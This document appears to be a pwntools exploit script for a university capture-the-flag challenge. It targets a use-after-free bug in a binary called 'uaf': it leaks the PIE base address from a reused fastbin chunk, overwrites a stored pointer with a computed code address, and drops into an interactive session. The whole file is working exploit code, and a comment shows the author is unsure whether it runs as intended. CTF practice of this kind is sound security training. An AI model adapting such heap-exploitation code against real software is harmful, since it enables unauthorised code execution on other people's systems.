import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('libc-2.23.so')

# NOTE: the binary should be patched with
#     patchelf --set-interpreter ld-2.23.so ./uaf
# for LD_PRELOAD to work

# p = remote('edu-ctf.csie.org', 10177)
p = process('./uaf', env={'LD_PRELOAD': os.path.join(os.getcwd(), './libc-2.23.so')})
# gdb.attach(p, 'b main\n')

# take the same fastbin
p.sendlineafter('Size of your message:', '16')

prefix = b'a' * 8
p.sendafter('Message:', prefix)
p.recvuntil(prefix)
pie_base = u64(p.recv(6) + b'\0\0') - 0xa77
log.success('PIE base: %s', hex(pie_base))

p.sendlineafter('Size of your message:', '16')
p.sendafter('Message:', b'\0' * 8 + p64(pie_base + 0xab5))

p.sendlineafter('Size of your message:', '123')
p.sendafter('Message:', b'X')

# the main program would crash??

p.interactive()
